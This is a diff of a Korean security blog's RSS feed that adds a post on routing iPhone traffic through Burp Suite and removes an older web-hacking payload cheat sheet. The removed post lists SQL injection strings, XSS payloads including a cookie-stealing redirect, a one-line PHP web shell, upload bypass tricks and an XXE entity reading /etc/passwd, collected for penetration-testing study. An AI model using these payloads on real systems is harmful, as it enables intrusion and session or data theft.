@@ -9,8 +9,40 @@
     <atom:link href="https://blog.jhyeon.dev/rss2.xml" rel="self" type="application/rss+xml"/>
     
     <description>JHYEON BLOG</description>
-    <pubDate>Sat, 14 Aug 2021 05:53:26 GMT</pubDate>
+    <pubDate>Sat, 14 Aug 2021 13:20:42 GMT</pubDate>
     <generator>http://hexo.io/</generator>
+    
+    <item>
+      <title>IOS 단말기에서 Burp Suite 프록시 사용 방법</title>
+      <link>https://blog.jhyeon.dev/2021/08/14/iosproxy-210814/</link>
+      <guid>https://blog.jhyeon.dev/2021/08/14/iosproxy-210814/</guid>
+      <pubDate>Sat, 14 Aug 2021 10:20:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h3 id=&quot;Summary&quot;&gt;&lt;a href=&quot;#Summary&quot; class=&quot;headerlink&quot; title=&quot;Summary&quot;&gt;&lt;/a&gt;Summary&lt;/h3&gt;&lt;p&gt;이번 게시글에서는 IOS 운영체제에서 Burp Suite 프록시를 구성하는 방법을 소개하고</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>이번 게시글에서는 IOS 운영체제에서 Burp Suite 프록시를 구성하는 방법을 소개하고자 합니다.</p><p>크게 어려운 사항은 없으나 <code>https</code> 패킷을 Intercept 하기 위해서는 Burp 인증서를 함께 설치해야합니다.</p><h3 id="네트워크-설정-IOS"><a href="#네트워크-설정-IOS" class="headerlink" title="네트워크 설정(IOS)"></a>네트워크 설정(IOS)</h3><p>우선 아이폰에 연결된 <code>WIFI</code> 탭에 들어가서 연결된 와이파이의 정보 탭에 들어가면</p><p>하단에 <code>HTTP 프록시</code> 에 보면 프록시 구성이 있을 것입니다.</p><p>해당 구성탭에 들어가서, 프록시 구성 모드를 <code>수동</code> 으로 설정한 뒤</p><p>서버란에는 Burp Suite를 사용할 PC(호스트)의 IP주소, 포트는 Burp Suite에서 본인이 설정한 포트를</p><p>입력해주면 됩니다.</p><p><img src="/img/post/iosproxy/iosproxy.jpeg" class="lazyload" data-srcset="/img/post/iosproxy/iosproxy.jpeg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h3 id="네트워크-설정-PC-Burp-Suite"><a href="#네트워크-설정-PC-Burp-Suite" class="headerlink" title="네트워크 설정(PC, Burp Suite)"></a>네트워크 설정(PC, Burp Suite)</h3><p>Burp Suite 에서의 네트워크 설정은 아래 사진과 같이 설정하면 됩니다.</p><p>Proxy &gt; Options &gt; Proxy Listeners 탭에서 Add를 눌러</p><p>Bind to port란에 디바이스와 통신할 포트(ex, 8081)을 적고</p><p>Bind to Address는 All interface 옵션으로 바꿔준 뒤 저장하면 됩니다.</p><p><img src="/img/post/iosproxy/proxyset.png" class="lazyload" data-srcset="/img/post/iosproxy/proxyset.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h3 id="인증서-설치-IOS"><a href="#인증서-설치-IOS" class="headerlink" title="인증서 설치(IOS)"></a>인증서 설치(IOS)</h3><p>아이폰 기기로 Safari 브라우저에 접속하신 뒤 아래 주소에 접속해주세요!</p><p><a href="http://burp/">http://burp</a></p><p>이후 오른쪽 상단에 있는 <code>CA Certificate</code> 메뉴를 누르신 뒤 인증서를 다운로드 받으신 후,</p><p>아이폰 설정 &gt; 일반 &gt; 프로파일 탭에 가시면 다운로드 받으신 인증서가 있습니다.</p><p>해당 인증서를 클릭하여 설치하시면 됩니다.</p><p><img src="/img/post/iosproxy/download.png" class="lazyload" data-srcset="/img/post/iosproxy/download.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p><img src="/img/post/iosproxy/download2.png" class="lazyload" data-srcset="/img/post/iosproxy/download2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p><img src="/img/post/iosproxy/download3.png" class="lazyload" data-srcset="/img/post/iosproxy/download3.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p>]]></content:encoded>
+      
+      
+      <category domain="https://blog.jhyeon.dev/categories/Mobile/">Mobile</category>
+      
+      
+      <category domain="https://blog.jhyeon.dev/tags/IOS/">IOS</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9/">모의해킹</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/%ED%94%84%EB%A1%9D%EC%8B%9C/">프록시</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Burp-Suite/">Burp Suite</category>
+      
+      
+      <comments>https://blog.jhyeon.dev/2021/08/14/iosproxy-210814/#disqus_thread</comments>
+      
+    </item>
     
     <item>
       <title>KOSPO 한국남부발전 2회차 정보보안 경진대회 후기</title>
@@ -34,11 +66,11 @@
       
       <category domain="https://blog.jhyeon.dev/tags/CTF/">CTF</category>
       
+      <category domain="https://blog.jhyeon.dev/tags/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9/">모의해킹</category>
+      
       <category domain="https://blog.jhyeon.dev/tags/KOSPO/">KOSPO</category>
       
       <category domain="https://blog.jhyeon.dev/tags/%ED%95%9C%EA%B5%AD%EB%82%A8%EB%B6%80%EB%B0%9C%EC%A0%84/">한국남부발전</category>
-      
-      <category domain="https://blog.jhyeon.dev/tags/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9/">모의해킹</category>
       
       <category domain="https://blog.jhyeon.dev/tags/%EB%B2%84%EA%B7%B8%EB%B0%94%EC%9A%B4%ED%8B%B0/">버그바운티</category>
       
@@ -219,11 +251,11 @@
       
       <category domain="https://blog.jhyeon.dev/tags/CTF/">CTF</category>
       
-      <category domain="https://blog.jhyeon.dev/tags/webhacking-kr/">webhacking.kr</category>
-      
       <category domain="https://blog.jhyeon.dev/tags/Web-Hacking/">Web Hacking</category>
       
       <category domain="https://blog.jhyeon.dev/tags/Wargame/">Wargame</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/webhacking-kr/">webhacking.kr</category>
       
       
       <comments>https://blog.jhyeon.dev/2021/07/10/webhackingkr-renew-0710/#disqus_thread</comments>
@@ -347,11 +379,11 @@
       
       <category domain="https://blog.jhyeon.dev/tags/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9/">모의해킹</category>
       
+      <category domain="https://blog.jhyeon.dev/tags/Burp-Suite/">Burp Suite</category>
+      
       <category domain="https://blog.jhyeon.dev/tags/%EC%9B%B9-%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9/">웹 모의해킹</category>
       
       <category domain="https://blog.jhyeon.dev/tags/%EC%9B%B9-%ED%95%B4%ED%82%B9/">웹 해킹</category>
-      
-      <category domain="https://blog.jhyeon.dev/tags/Burp-Suite/">Burp Suite</category>
       
       <category domain="https://blog.jhyeon.dev/tags/Fiddler/">Fiddler</category>
       
@@ -637,41 +669,6 @@
       
       
       <comments>https://blog.jhyeon.dev/2021/04/25/il2cppdumper-210425/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>Web/Hacking Payload Docx</title>
-      <link>https://blog.jhyeon.dev/2021/04/21/webpayload-210421/</link>
-      <guid>https://blog.jhyeon.dev/2021/04/21/webpayload-210421/</guid>
-      <pubDate>Tue, 20 Apr 2021 15:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h2 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h2&gt;&lt;p&gt;해당 자료는 웹 해킹에 종류별 페이로드 문서를 정리하는 목적으로 작성된 게시글입니다.&lt;/p&gt;
-&lt;p&gt;자료는</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>해당 자료는 웹 해킹에 종류별 페이로드 문서를 정리하는 목적으로 작성된 게시글입니다.</p><p>자료는 계속해서 업데이트가 되는 자료이며, 최신순을 기준으로 상단에 기록됩니다.</p><p>페이로드는 보안상 문제로 일부 변환되어 표시되며 다음 사이트에서 복호화가 가능합니다.</p><ul><li><a href="http://parkjuwan.dothome.co.kr/webapp/ltgt_conv/">http://parkjuwan.dothome.co.kr/webapp/ltgt_conv/</a></li></ul><h3 id="SQL-Injection-Basic"><a href="#SQL-Injection-Basic" class="headerlink" title="SQL Injection(Basic)"></a>SQL Injection(Basic)</h3><pre><code>&#39; or &#39;1&#39; = &#39;1&#39; or 1=1#&#39; or 1=1--or 1=1or true--or 1=1/*1′) and &#39;1′=&#39;1–admin&#39; --&#39; order by 2#&#39; union select 1,2,3,version()#&#39; union select 1,2,3,table_name from information.schema.tables#&#39; union select 1,2,3,table_name from information.schema.tables where table_name=&#39;tb_name&#39;#select count(*) from information_schema.tables where tables_schema=database();select length(table_name) from information_schema.tables where tables_schema=database() limit 0,1;select length(column_name) from table_name;select ascii(substring(table_name, 1, 1)) from informatio.schema.tables where table_schema=database(), limit 0, 1;</code></pre><h3 id="SQL-Injection-NoSQL"><a href="#SQL-Injection-NoSQL" class="headerlink" title="SQL Injection(NoSQL)"></a>SQL Injection(NoSQL)</h3><pre><code class="sql">param1[$ne]=1234&amp;param2[$ne]=0000</code></pre><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><pre><code class="html">&lt;!-- basic --&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;lt;img src=x onerror=alert(1)&amp;gt;&amp;lt;img src=javascript:alert(1)&amp;gt;&amp;lt;img src=&quot;javascript:alert(1)&quot;&amp;gt;&amp;lt;img src=javascript:alert(String.FromCharCode(88,83,83))&amp;gt;&amp;lt;img src=x onmouseover=&quot;alert(1)&quot;&amp;gt;&amp;lt;img src=&amp;amp;#106;&amp;amp;#97;&amp;amp;#118;&amp;amp;#97;&amp;amp;#115;&amp;amp;#99;&amp;amp;#114;&amp;amp;#105;&amp;amp;#112;&amp;amp;#116;&amp;amp;#58;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#39;&amp;amp;#88;&amp;amp;#83;&amp;amp;#83;&amp;amp;#39;&amp;amp;#41;&amp;gt;&amp;lt;svg onload=alert(1)&amp;gt;&amp;lt;body onload=alert(1)&amp;gt;&lt;!-- HTML CHAR --&gt;&amp;#x3c;script&amp;#x3e;alert(1)&amp;#x3c;/script&amp;#x3e;&lt;!-- UNICODE Encoding --&gt;%u003cscript%u003ealert(1)%u003c/script%u003e&lt;!-- redirect --&gt;&amp;lt;script&amp;gt;location.href=&#39;url&#39;;&amp;lt;/script&amp;gt;&amp;lt;img src=x onerror=&quot;this.src=&#39;url&#39;&quot;;/&amp;gt;&amp;lt;iframe src=&quot;data/html, urlencode_text&quot;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;!-- session hijacking --&gt;&amp;lt;script&amp;gt;location.href=&#39;url/&#39;+document.cookie;&amp;lt;/script&amp;gt;</code></pre><h3 id="WebShell"><a href="#WebShell" class="headerlink" title="WebShell"></a>WebShell</h3><pre><code class="php">&lt;?phpsystem($_GET[&#39;cmd&#39;]);?&gt;</code></pre><h3 id="WebShell-Bypass-Trick"><a href="#WebShell-Bypass-Trick" class="headerlink" title="WebShell(Bypass Trick)"></a>WebShell(Bypass Trick)</h3><ul><li><p>filename extension (php.jpg , php.png …)</p></li><li><p>gif89a, jpg, png (Insert to Image File Header)</p></li></ul><h3 id="PHP-Wrapper-Injection"><a href="#PHP-Wrapper-Injection" class="headerlink" title="PHP Wrapper Injection"></a>PHP Wrapper Injection</h3><pre><code>expect://lsphp://filter/convert.base64-encode/resource=filename</code></pre><h3 id="SSTI-Python"><a href="#SSTI-Python" class="headerlink" title="SSTI(Python)"></a>SSTI(Python)</h3><pre><code>&#123;&#123;7*7&#125;&#125;&#123;&#123;config.items()&#125;&#125;&#123;&#123; [].class.base.subclasses() &#125;&#125;&#123;&#123;''.class.mro()[1].subclasses()&#125;&#125;&#123;&#123; ''.__class__.__mro__[2].__subclasses__() &#125;&#125;</code></pre><h3 id="SSTI-Bypass-Trick"><a href="#SSTI-Bypass-Trick" class="headerlink" title="SSTI(Bypass Trick)"></a>SSTI(Bypass Trick)</h3><p><img src="/img/post/webpayload/filters.png" class="lazyload" data-srcset="/img/post/webpayload/filters.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="photo1"></p><ul><li>ascii encode(<a href="http://defindit.com/ascii.html">http://defindit.com/ascii.html</a>)</li></ul><h3 id="XML-Injection"><a href="#XML-Injection" class="headerlink" title="XML Injection"></a>XML Injection</h3><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE cmd [                                     &lt;!ENTITY passwd SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;                                                 &lt;cmd&gt;&amp;passwd;&lt;/cmd&gt;</code></pre><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet">https://owasp.org/www-community/xss-filter-evasion-cheatsheet</a></li><li><a href="https://github.com/payloadbox/ssti-payloads">https://github.com/payloadbox/ssti-payloads</a></li><li><a href="https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f">https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f</a></li><li><a href="https://github.com/omurugur/SQL_Injection_Payload/">https://github.com/omurugur/SQL_Injection_Payload/</a></li></ul>]]></content:encoded>
-      
-      
-      <category domain="https://blog.jhyeon.dev/categories/Web/">Web</category>
-      
-      
-      <category domain="https://blog.jhyeon.dev/tags/Web/">Web</category>
-      
-      <category domain="https://blog.jhyeon.dev/tags/Penetration/">Penetration</category>
-      
-      <category domain="https://blog.jhyeon.dev/tags/OWASP/">OWASP</category>
-      
-      <category domain="https://blog.jhyeon.dev/tags/WebHacking/">WebHacking</category>
-      
-      <category domain="https://blog.jhyeon.dev/tags/webhacking-kr/">webhacking.kr</category>
-      
-      
-      <comments>https://blog.jhyeon.dev/2021/04/21/webpayload-210421/#disqus_thread</comments>
       
     </item>
     
